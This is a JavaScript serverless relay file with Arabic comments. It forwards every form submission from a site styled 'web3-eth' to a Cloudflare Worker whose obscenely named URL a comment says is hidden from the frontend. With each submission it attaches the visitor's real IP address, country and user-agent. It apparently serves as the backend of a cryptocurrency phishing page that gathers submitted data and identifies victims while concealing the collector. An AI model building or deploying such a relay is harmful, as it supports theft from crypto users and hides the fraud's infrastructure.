// api/submit.js
// ---------------------------------------------
// ⛳️ رابط الـWorker (مخفي عن الواجهة)
const WORKER_URL = "https://1fuckurmotherhahahahahahahah.eth2-stiffness640.workers.dev/";

// 🔒 السماح فقط لموقعك الحقيقي
const ALLOWED_ORIGINS = [
  "https://web3-eth.netlify.app"
];

// 🔑 السرّ السري بين Vercel ↔ Worker (Vercel → Settings → Environment Variables)
const RELAY_SECRET = process.env.RELAY_SECRET || "";

// دالة لاستخراج Origin من Referer (لو المتصفح ما أرسل Origin)
function originFromReferer(referer = "") {
  try {
    if (!referer) return "";
    const u = new URL(referer);
    return `${u.protocol}//${u.host}`;
  } catch {
    return "";
  }
}

export default async function handler(req, res) {
  const reqOrigin = req.headers.origin || "";
  const referer = req.headers.referer || "";
  const origin = reqOrigin || originFromReferer(referer);

  // استخرج IP الحقيقي والدولة من هيدرز Vercel
  const fwdFor = req.headers["x-forwarded-for"] || "";
  const clientIPHeader = Array.isArray(fwdFor) ? fwdFor[0] : fwdFor;
  const realClientIP = (clientIPHeader || "").split(",")[0].trim(); // أول IP في السلسلة
  const clientCountry = req.headers["x-vercel-ip-country"] || "";   // قد تكون فارغة أحيانًا
  const clientUA = req.headers["user-agent"] || "";

  // --- OPTIONS (preflight) ---
  if (req.method === "OPTIONS") {
    if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: "Forbidden origin (preflight)", got: origin || null });
    }
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    res.setHeader("Vary", "Origin");
    return res.status(200).send("ok");
  }

  // --- رفض غير POST ---
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  // --- فحص الأصل ---
  if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin || "*");
    res.setHeader("Vary", "Origin");
    return res.status(403).json({ error: "Forbidden origin", got: origin || null });
  }

  try {
    // --- تمرير الطلب للـWorker + إضافة X-Relay-Secret + معلومات العميل الحقيقي ---
    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Origin": origin,
        "X-Relay-Secret": RELAY_SECRET,     // حماية القناة بين Vercel ↔ Worker
        "X-Client-IP": realClientIP || "",  // IP الحقيقي للزائر
        "X-Client-Country": clientCountry,  // الدولة (إن توفرت)
        "X-Client-UA": clientUA             // User-Agent الحقيقي (اختياري مفيد)
      },
      body: JSON.stringify(req.body)
    });

    const raw = await response.text();
    let payload;
    try { payload = JSON.parse(raw); } catch { payload = { raw }; }

    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");

    return res.status(response.status).json(payload);
  } catch (err) {
    res.setHeader("Access-Control-Allow-Origin", origin || "*");
    res.setHeader("Vary", "Origin");
    return res.status(500).json({
      error: "Failed forwarding request",
      details: err?.message || "unknown"
    });
  }
}
